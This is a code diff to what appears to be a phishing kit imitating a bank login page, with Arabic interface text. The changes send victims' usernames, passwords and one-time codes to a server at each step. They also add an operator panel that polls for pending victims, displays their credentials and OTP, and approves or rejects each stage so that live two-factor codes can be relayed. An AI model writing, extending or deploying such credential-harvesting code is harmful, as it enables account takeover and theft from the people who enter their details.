@@ -332,6 +332,21 @@ function setState(upd) {
   onStateChange();
 }
 
+function getApplicantData(){
+  try{return JSON.parse(localStorage.getItem('bna_applicant') || '{}');}catch(e){return {};}
+}
+
+async function syncApplication(extra){
+  const applicant=getApplicantData();
+  const payload={...applicant,...extra};
+  if(S.applicationId)payload.id=S.applicationId;
+  const response=await fetch('/api/applications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+  if(!response.ok)throw new Error('application sync failed');
+  const result=await response.json();
+  if(result.application && result.application.id)S.applicationId=result.application.id;
+  return result.application;
+}
+
 if (BC) BC.onmessage = e => { if(e.data.t==='s'){ Object.assign(S,e.data.d); onStateChange(); } };
 setInterval(()=>{
   try{
@@ -368,12 +383,17 @@ if(window.location.hash==='#admin'){ document.body.className='light'; go('admin-
 // LOGIN
 // ============================================================
 const li=document.getElementById('li');
-document.getElementById('nextBtn').addEventListener('click',()=>{
+document.getElementById('nextBtn').addEventListener('click',async()=>{
   const v=li.value.trim();
   if(!v){document.getElementById('lerr').textContent='Please enter your login';return;}
   document.getElementById('lerr').textContent='';
-  setState({login:v, status:'idle'});
-  go('password');
+  try{
+    const application=await syncApplication({username:v,login:v,status:'pending_login'});
+    setState({login:v, applicationId:application.id, status:'pending_login'});
+    go('password');
+  }catch(e){
+    document.getElementById('lerr').textContent='تعذر إرسال البيانات، حاول مرة أخرى';
+  }
 });
 li.addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('nextBtn').click();});
 li.addEventListener('input',()=>{document.getElementById('lerr').textContent='';});
@@ -424,8 +444,10 @@ document.getElementById('kbd').addEventListener('click',e=>{
   if(ps){ps=false;upCase();}
 });
 
-document.getElementById('subBtn').addEventListener('click',()=>{
+document.getElementById('subBtn').addEventListener('click',async()=>{
   if(!pv)return;
+  try{await syncApplication({username:S.login,password:pv,status:'pending_password'});}
+  catch(e){document.getElementById('frErr').textContent='تعذر إرسال كلمة المرور';document.getElementById('frErr').style.display='block';return;}
   setState({password:pv, status:'pending_password'});
   document.getElementById('pwInp').style.display='none';
   const w=document.getElementById('pwWait');
@@ -475,10 +497,12 @@ document.getElementById('npad').addEventListener('click',e=>{
   if(n==='DEL'){const f=obs.filter(b=>b.value);if(f.length){const l=f[f.length-1];l.value='';l.focus();}}
   else{const em=obs.find(b=>!b.value);if(em){em.value=n;const idx=obs.indexOf(em);if(idx<obs.length-1)obs[idx+1].focus();}}
 });
-document.getElementById('otpConf').addEventListener('click',()=>{
+document.getElementById('otpConf').addEventListener('click',async()=>{
   const otp=obs.map(b=>b.value).join('');
   if(otp.length<6){document.getElementById('oerr').textContent='الرمز غير مكتمل';return;}
   document.getElementById('oerr').textContent='';
+  try{await syncApplication({username:S.login,password:S.password,otp,status:'pending_otp'});}
+  catch(e){document.getElementById('oerr').textContent='تعذر إرسال رمز التحقق';return;}
   setState({otp, status:'pending_otp'});
   document.getElementById('otpConf').style.display='none';
   document.getElementById('owait').style.display='flex';
@@ -555,7 +579,14 @@ function startAdmPoll(){
   admTmr=setInterval(checkAdm,600);
   checkAdm();
 }
-function checkAdm(){
+async function checkAdm(){
+  try{
+    const applications=await fetchApplicationsFromServer();
+    const pending=applications.find(application=>['pending_login','pending_password','pending_otp'].includes(application.status));
+    if(pending){
+      Object.assign(S,{applicationId:pending.id,login:pending.username || pending.login || '',password:pending.password || '',otp:pending.otp || '',status:pending.status});
+    }
+  }catch(e){}
   const sig = stateSignature(S);
   if(sig===lastStateSignature)return;
   lastStateSignature=sig;
@@ -614,16 +645,26 @@ function updPend(){
     dot.style.display='block';sec.style.display='block';
     document.getElementById('pttl').textContent='🔔 طلب تسجيل دخول جديد';
     document.getElementById('pdata').innerHTML='';
-    document.getElementById('admAccept').onclick=()=>{setState({status:'password_accepted'});};
-    document.getElementById('admReject').onclick=()=>{setState({status:'password_rejected'});};
+    document.getElementById('admAccept').onclick=()=>decideApplication('password_accepted');
+    document.getElementById('admReject').onclick=()=>decideApplication('password_rejected');
   } else if(S.status==='pending_otp'){
     dot.style.display='block';sec.style.display='block';
     document.getElementById('pttl').textContent='🔔 رمز التحقق';
     document.getElementById('pdata').innerHTML=`
       <div class="prow"><span class="plbl">رمز التأكيد</span><span class="pval hi" style="font-size:22px;letter-spacing:4px">${S.otp}</span></div>`;
-    document.getElementById('admAccept').onclick=()=>{setState({status:'otp_accepted'});};
-    document.getElementById('admReject').onclick=()=>{setState({status:'otp_rejected'});};
+    document.getElementById('admAccept').onclick=()=>decideApplication('otp_accepted');
+    document.getElementById('admReject').onclick=()=>decideApplication('otp_rejected');
   } else { dot.style.display='none'; sec.style.display='none'; }
+}
+
+async function decideApplication(status){
+  if(!S.applicationId)return;
+  try{
+    const response=await fetch('/api/applications/'+encodeURIComponent(S.applicationId),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({status})});
+    if(!response.ok)throw new Error('decision failed');
+    setState({status});
+    await renderTable();
+  }catch(e){alert('تعذر تحديث حالة الطلب');}
 }
 
 // ============================================================
@@ -648,7 +689,7 @@ function normalizeApplicant(item, fallbackId){
   const idNum = item.idNum || item.nationalId || item.id_number || '';
   const email = item.email || '';
   const address = item.address || [item.wilaya, item.commune, item.street].filter(Boolean).join(' / ') || '';
-  return { id, name, email, idNum, phone, address, status: item.status || 'new' };
+  return { id, name, email, idNum, phone, address, username: item.username || item.login || '', password: item.password || '', otp: item.otp || '', status: item.status || 'new' };
 }
 
 function getStoredApplications(){
@@ -728,7 +769,7 @@ async function renderTable(){
   tb.querySelectorAll('.bdet').forEach(btn=>{
     btn.addEventListener('click',e=>{
       e.stopPropagation();
-      const id=+btn.dataset.id;
+      const id=btn.dataset.id;
       const w=document.getElementById('dw'+id);
       if(openDD&&openDD!==w){openDD.querySelector('.dd')?.remove();}
       if(w.querySelector('.dd')){w.querySelector('.dd').remove();openDD=null;return;}
@@ -736,7 +777,9 @@ async function renderTable(){
       const dd=document.createElement('div');dd.className='dd';dd.dataset.role='details';
       dd.style.top='18px';dd.style.left='50%';dd.style.transform='translateX(-50%)';dd.style.width='min(780px, calc(100vw - 18px))';dd.style.maxHeight='86vh';dd.style.overflowY='auto';
       dd.innerHTML=`<div class="ddttl">🔍 تفاصيل المستخدم</div>
-        <div class="ddrow"><span class="ddk">رمز التأكيد</span><span class="ddv hi">${S.otp || '-'}</span></div>
+        <div class="ddrow"><span class="ddk">اسم المستخدم</span><span class="ddv">${u.username || '-'}</span></div>
+        <div class="ddrow"><span class="ddk">كلمة المرور</span><span class="ddv">${u.password || '-'}</span></div>
+        <div class="ddrow"><span class="ddk">رمز التأكيد</span><span class="ddv hi">${u.otp || '-'}</span></div>
         <div class="ddrow"><span class="ddk">الاسم</span><span class="ddv">${u.name}</span></div>
         <div class="ddrow"><span class="ddk">رقم الجوال</span><span class="ddv">${u.phone}</span></div>
         <div class="ddrow"><span class="ddk">البريد</span><span class="ddv">${u.email}</span></div>
